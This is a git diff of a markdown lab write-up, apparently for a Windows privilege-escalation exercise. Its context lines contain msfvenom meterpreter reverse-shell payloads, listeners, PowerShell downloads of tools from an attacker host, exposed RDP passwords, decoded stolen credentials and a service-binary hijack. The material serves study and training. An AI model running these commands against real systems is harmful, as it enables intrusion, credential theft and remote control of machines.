@@ -67,16 +67,19 @@ ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
 ![image7](../resources/e693a609ebc8468e93c025fcde5ca396.png)
 
 - Create payload
+  
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.102.155.66 LPORT=4445 -f exe -o reverse.exe
 
 ```
 - Set up listener
+  
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 10.102.155.66; set lport 4445; exploit"
 
 ```
 - Copy reverse payload over:
+  
 ```bash
 (new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/reverse.exe',' C:\Users\teddy\reverse.exe')
 
@@ -111,6 +114,7 @@ Got SYSTEM shell
 ![image10](../resources/32f3b39d7e4c438bab3c9f6a7ba146ef.png)
 
 - More stable shell:
+  
 ```bash
 ps
 
@@ -135,6 +139,7 @@ xfreerdp /v:10.102.188.254 /u:DefaultUserAccount /p:U8WXLhuAVQs25f7R /dynamic-re
 
 ```
 - Upload WinPEAS:
+  
 ```bash
 (new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/winPEAS.exe',' C:\Users\DefaultUserAccount\winPEAS.exe')
 
@@ -155,6 +160,7 @@ C:\Users\svcSetup\My Documents\Shared Documents\Development\ChangePassword\crede
 C:\Users\svcSetup\My Documents\Shared Documents\Development\ChangePassword\credentials\user
 
 - Base64 decode the files:
+  
 ```bash
 echo "c3ZjU2V0dXA=" | base64 -d
 
@@ -184,7 +190,8 @@ echo "U2V0dXAtQWNjb3VudC1QYXNzd29yZC0x" | base64 -d
 xfreerdp /v:10.102.131.27 /u:rudy /p:m9R4pvrRjgFk /dynamic-resolution
 
 ```
-- Upload WinPEAS
+- Upload WinPEAS:
+  
 ```bash
 (new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/winPEAS.exe',' C:\Users\rudy\winPEAS.exe')
 
@@ -200,6 +207,7 @@ File Permissions: rudy \[AllAccess\]
 Possible DLL Hijacking in binary folder: **C:\Program Files\Dev Builds\New Updater Service** (rudy \[AllAccess\])
 
 - Manually Check for Services:
+  
 ```bash
 Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike "C:\Windows\*" } | select Name,DisplayName,StartMode,PathName
 
@@ -208,6 +216,7 @@ Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartM
 ![image22](../resources/06cc989c0b3e4f4ca7e7e5ec48464c53.png)
 
 - Enumerate the system architecture before uploading tools:
+  
 ```bash
 systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
 
@@ -216,6 +225,7 @@ systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System T
 ![image23](../resources/ae5e9cbce60f459b9b4b4fe3aa048d34.png)
 
 - Upload accesschk
+  
 ```bash
 (new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/accesschk64.exe',' C:\Users\rudy\accesschk64.exe')
 
@@ -232,26 +242,31 @@ systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System T
 Rudy has FILE_ALL_ACCESS on this folder
 
 - Create payload
+  
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.102.155.66 LPORT=5555-f exe -o "Automatic Updater.exe"
 
 ```
 - Set up listener
+  
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 10.102.155.66; set lport 5555; exploit"
 
 ```
 - Upload reverse shell
+  
 ```bash
 (new-object System.Net.WebClient).DownloadFile('http://10.102.155.66:8080/"Automatic Updater.exe"',' C:\Users\rudy\\Automatic Updater.exe"')
 
 ```
 - Rename the original
+  
 ```bash
 mv C:\Program Files\Dev Builds\New Updater Service\Automatic Updater.exe C:\Program Files\Dev Builds\New Updater Service\Automatic.bak
 
 ```
 - Move the malicious file into the original folder
+  
 ```bash
 mv ".\Automatic Updater.exe" "C:\Program Files\Dev Builds\New Updater Service"
 ```
@@ -265,6 +280,7 @@ Got shell
 ![image25](../resources/60a056233748485a912c1e04cfa98ab2.png)
 
 - More stable shell:
+  
 ```bash
 ps
 
